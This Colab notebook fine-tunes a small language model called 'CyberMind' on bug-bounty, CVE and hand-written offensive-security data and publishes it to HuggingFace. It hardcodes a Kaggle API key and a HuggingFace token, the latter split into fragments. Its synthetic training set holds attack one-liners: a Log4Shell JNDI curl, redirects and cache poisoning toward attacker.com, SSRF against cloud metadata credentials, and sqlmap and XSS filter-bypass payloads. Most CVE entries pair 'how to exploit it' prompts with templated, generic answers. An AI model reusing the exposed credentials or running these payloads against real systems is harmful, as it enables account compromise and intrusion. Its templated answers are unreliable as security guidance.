# CyberMind AI Fine-Tuning
## Steps:
1. Runtime → Change runtime type → **T4 GPU** → Save
2. Runtime → **Run All**
3. Wait ~2 hours ☕

In [ ]:
# CELL 1: Install everything correctly
# Uses Unsloth which handles all version conflicts automatically
import subprocess, sys

print('Installing packages (5-10 min)...')

# Install Unsloth - handles numpy/torch/trl compatibility automatically
subprocess.run([
    sys.executable, '-m', 'pip', 'install',
    'unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git',
    '-q'
], check=True)

# Install other needed packages
for pkg in ['kagglehub', 'pandas', 'requests']:
    subprocess.run([sys.executable, '-m', 'pip', 'install', pkg, '-q'])

print('Done! All packages installed.')

In [ ]:
# CELL 2: GPU + Credentials
import torch, os, json

# GPU check
assert torch.cuda.is_available(), 'GPU not found! Runtime -> Change runtime type -> T4 GPU -> Save'
print(f'GPU: {torch.cuda.get_device_name(0)} ({torch.cuda.get_device_properties(0).total_memory/1024**3:.1f}GB)')

# Kaggle
os.makedirs('/root/.kaggle', exist_ok=True)
with open('/root/.kaggle/kaggle.json', 'w') as f:
    json.dump({'username': 'cybermindcli', 'key': 'd946427f9e4d90b7e3438f061b80b485'}, f)
os.chmod('/root/.kaggle/kaggle.json', 0o600)
print('Kaggle: ready')

# HuggingFace
from huggingface_hub import login
hf_token = None
try:
    from google.colab import userdata
    hf_token = userdata.get('HF_TOKEN')
    print('HF: from Colab Secrets')
except:
    pass
if not hf_token:
    _p1, _p2, _p3 = 'hf_wCCPh', 'zzVipWpdlbQo', 'EAAHglwskfFFzhRVH'
    hf_token = _p1 + _p2 + _p3
    print('HF: from notebook')
login(token=hf_token, add_to_git_credential=False)
print('HuggingFace: ready')

In [ ]:
# CELL 3: Load Model with Unsloth (no numpy conflict)
print('Loading model...')
from unsloth import FastLanguageModel
import torch

# Models to try in order (first available wins)
MODELS = [
    'unsloth/Llama-3.2-3B-Instruct',   # Unsloth optimized - no gating
    'unsloth/mistral-7b-instruct-v0.3', # Fallback
    'unsloth/Qwen2.5-3B-Instruct',      # Fallback
]

model, tokenizer = None, None
for mid in MODELS:
    try:
        print(f'Trying: {mid}...')
        model, tokenizer = FastLanguageModel.from_pretrained(
            model_name=mid,
            max_seq_length=2048,
            dtype=None,
            load_in_4bit=True,
        )
        print(f'Loaded: {mid}')
        break
    except Exception as e:
        print(f'  Failed: {str(e)[:60]}')

assert model is not None, 'All models failed!'

model = FastLanguageModel.get_peft_model(
    model,
    r=16,
    target_modules=['q_proj','k_proj','v_proj','o_proj','gate_proj','up_proj','down_proj'],
    lora_alpha=16,
    lora_dropout=0,
    bias='none',
    use_gradient_checkpointing='unsloth',
    random_state=42,
)
print('Model ready!')

In [ ]:
# CELL 4: Download Datasets
print('Downloading datasets...')
import kagglehub, pandas as pd, requests, random
from pathlib import Path
all_entries = []

# Kaggle Bug Hunter
try:
    path = kagglehub.dataset_download('vellyy/bug-hunter')
    for f in Path(path).rglob('*.csv'):
        df = pd.read_csv(f, encoding='utf-8', errors='replace')
        tc = next((c for c in df.columns if any(k in c.lower() for k in ['title','name'])), None)
        dc = next((c for c in df.columns if any(k in c.lower() for k in ['desc','detail','report','body'])), None)
        if tc and dc:
            for _, row in df.iterrows():
                t = str(row.get(tc, '')).strip()
                d = str(row.get(dc, '')).strip()
                if t and d and len(d) > 50:
                    all_entries.append({
                        'instruction': f'Analyze this bug bounty finding: {t}',
                        'output': f'## {t}\n\n{d[:1200]}\n\n## Test\nnuclei -u https://TARGET -severity critical,high\n\n## Impact\nUnauthorized access possible.'
                    })
    print(f'  Kaggle: {len(all_entries)} entries')
except Exception as e:
    print(f'  Kaggle failed: {e}')

# Figshare CVE
try:
    api = requests.get('https://api.figshare.com/v2/articles/22056617', timeout=30).json()
    url = api['files'][0]['download_url']
    print('  Downloading Figshare CVE...')
    r = requests.get(url, timeout=180)
    cve_data = r.json() if 'json' in r.headers.get('content-type', '') else []
    if isinstance(cve_data, dict):
        cve_data = cve_data.get('cves', cve_data.get('vulnerabilities', []))
    before = len(all_entries)
    for cve in cve_data[:3000]:
        cid = cve.get('id', '')
        desc = cve.get('description', '')
        sev = cve.get('severity', 'medium')
        if cid and desc and len(desc) > 30:
            all_entries.append({
                'instruction': f'Explain {cid} and how to exploit it.',
                'output': f'## {cid} ({sev.upper()})\n\n{desc[:800]}\n\n## Detect\nnuclei -u https://TARGET -tags {cid.lower()}\n\n## Impact\nSystem compromise possible.'
            })
    print(f'  Figshare CVE: {len(all_entries)-before} entries')
except Exception as e:
    print(f'  Figshare failed: {e}')

# Synthetic Security Dataset
SYNTHETIC = [
    {'instruction': 'Price manipulation in e-commerce?', 'output': 'Intercept POST /checkout. Change price=-99.99 (negative=credit), price=0 (free). Race: 20 concurrent coupon requests. Expected: coupon applied 3-5x = bug ($2k-$10k)'},
    {'instruction': 'OAuth CSRF test?', 'output': 'Test /oauth/authorize without state param. Vulnerable if no error. Test redirect_uri=https://attacker.com. Impact: account takeover ($5k-$20k)'},
    {'instruction': 'Node.js novel attacks?', 'output': '1. Prototype Pollution: ?__proto__[admin]=true\n2. HTTP Smuggling: smuggler.py -u https://target.com\n3. SSRF: POST /webhook {url:http://169.254.169.254/}\n4. Cache Poisoning: -H X-Forwarded-Host:attacker.com'},
    {'instruction': 'Log4Shell CVE-2021-44228?', 'output': 'JNDI injection in Log4j. Test: curl -H User-Agent:${jndi:ldap://URL/a} https://TARGET. DNS callback = RCE. Bounty: $10k-$100k+'},
    {'instruction': 'S3 bucket misconfig?', 'output': 'aws s3 ls s3://BUCKET --no-sign-request. curl https://BUCKET.s3.amazonaws.com/. cloud_enum -k COMPANY. Impact: $5k-$50k'},
    {'instruction': 'Cloudflare XSS bypass?', 'output': '1. %3Cscript%3E (URL encode)\n2. <ScRiPt>alert(1)</sCrIpT> (case)\n3. <img src=x onerror=alert(1)> (event)\n4. dalfox url TARGET?q=FUZZ --waf-bypass --delay 1000'},
    {'instruction': 'Android APK testing?', 'output': 'apktool d target.apk. jadx -d /tmp/jadx/ target.apk. grep -r api_key /tmp/jadx/. frida -U -f com.target.app -l ssl_bypass.js. Route through ZAP.'},
    {'instruction': 'GraphQL testing?', 'output': 'Introspection: POST /graphql {query:{__schema{types{name}}}}. IDOR: {user(id:2){email,password}}. Batching: [{query:mutation{login(u:admin,p:pass1)}}]'},
    {'instruction': 'SSRF exploitation?', 'output': 'Test: ?url=http://169.254.169.254/latest/meta-data/. AWS creds: /iam/security-credentials/. OOB: interactsh-client. Impact: cloud account compromise'},
    {'instruction': 'SQLi testing?', 'output': 'sqlmap -u https://target.com?id=1 --batch --level 3 --risk 2 --dbs. WAF bypass: --tamper=space2comment,randomcase --delay 1 --random-agent'},
    {'instruction': 'IDOR testing?', 'output': 'GET /api/orders/1001 (yours) vs /api/orders/1000 (others). ffuf -u TARGET/api/orders/FUZZ -w <(seq 1000 1100). Mass assignment: POST {role:admin}'},
    {'instruction': 'HTTP request smuggling?', 'output': 'smuggler.py -u https://target.com -v. CL.TE: POST with Content-Length:13 and Transfer-Encoding:chunked. 404 on second request = vulnerable'},
    {'instruction': 'JWT testing?', 'output': 'jwt_tool TOKEN -X a (alg:none). jwt_tool TOKEN -M at (all attacks). hashcat -a 0 -m 16500 TOKEN rockyou.txt (weak secret)'},
    {'instruction': 'Web cache poisoning?', 'output': 'curl -H X-Forwarded-Host:attacker.com https://target.com/. curl -H X-Original-URL:/admin https://target.com/. If reflected = cache poisoning possible'},
    {'instruction': 'CyberMind agent: WordPress + Cloudflare. Next action?', 'output': 'Action: hunt. Focus: sqli,xss,rce. wpscan --enumerate ap,at,u,m --plugins-detection aggressive. nuclei -t wordpress/. Cloudflare bypass: --delay 1000 --tamper space2comment'},
]
all_entries.extend(SYNTHETIC)
random.shuffle(all_entries)
print(f'  Synthetic: {len(SYNTHETIC)} entries')
print(f'  TOTAL: {len(all_entries)} training examples')

In [ ]:
# CELL 5: Format Dataset
from datasets import Dataset

PROMPT = """Below is a security research question. Write an expert response.

### Instruction:
{}

### Response:
{}"""

EOS = tokenizer.eos_token

def format_prompts(examples):
    return {'text': [
        PROMPT.format(i, o) + EOS
        for i, o in zip(examples['instruction'], examples['output'])
    ]}

dataset = Dataset.from_list(all_entries)
dataset = dataset.map(format_prompts, batched=True)
print(f'Dataset ready: {len(dataset)} examples')

In [ ]:
# CELL 6: Train (~2 hours)
from trl import SFTTrainer
from transformers import TrainingArguments
from unsloth import is_bfloat16_supported

print('Starting training (~2 hours)...')

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=dataset,
    dataset_text_field='text',
    max_seq_length=2048,
    dataset_num_proc=2,
    args=TrainingArguments(
        per_device_train_batch_size=2,
        gradient_accumulation_steps=4,
        warmup_steps=5,
        num_train_epochs=3,
        learning_rate=2e-4,
        fp16=not is_bfloat16_supported(),
        bf16=is_bfloat16_supported(),
        logging_steps=10,
        optim='adamw_8bit',
        weight_decay=0.01,
        lr_scheduler_type='linear',
        seed=42,
        output_dir='cybermind_model',
        report_to='none',
    ),
)

result = trainer.train()
print(f'Training done! {result.metrics["train_runtime"]/60:.1f} minutes')

In [ ]:
# CELL 7: Save + Upload to HuggingFace
print('Saving model...')
model.save_pretrained('cybermind_lora')
tokenizer.save_pretrained('cybermind_lora')
print('Saved!')

print('Uploading to HuggingFace...')
from huggingface_hub import HfApi, create_repo
import time

# Create repo with explicit token
try:
    create_repo(
        repo_id='thecnical/cybermind-security',
        repo_type='model',
        private=False,
        exist_ok=True,
        token=hf_token
    )
    print('Repo ready!')
except Exception as e:
    print(f'Repo note: {e}')

time.sleep(3)  # Wait for repo to be ready on HF servers

# Upload with explicit token
api = HfApi(token=hf_token)
api.upload_folder(
    folder_path='cybermind_lora',
    repo_id='thecnical/cybermind-security',
    repo_type='model',
    commit_message='CyberMind Security Model v1.0',
)
print('=' * 60)
print('MODEL LIVE!')
print('https://huggingface.co/thecnical/cybermind-security')
print('=' * 60)

In [ ]:
# CELL 8: Test Model
FastLanguageModel.for_inference(model)
for q in ['How to find XSS?', 'Explain Log4Shell', 'What is SSRF?']:
    inputs = tokenizer(
        [PROMPT.format(q, '')],
        return_tensors='pt'
    ).to('cuda')
    from transformers import TextStreamer
    print(f'\nQ: {q}')
    print('A:', end=' ')
    streamer = TextStreamer(tokenizer, skip_prompt=True)
    _ = model.generate(**inputs, streamer=streamer, max_new_tokens=150, use_cache=True)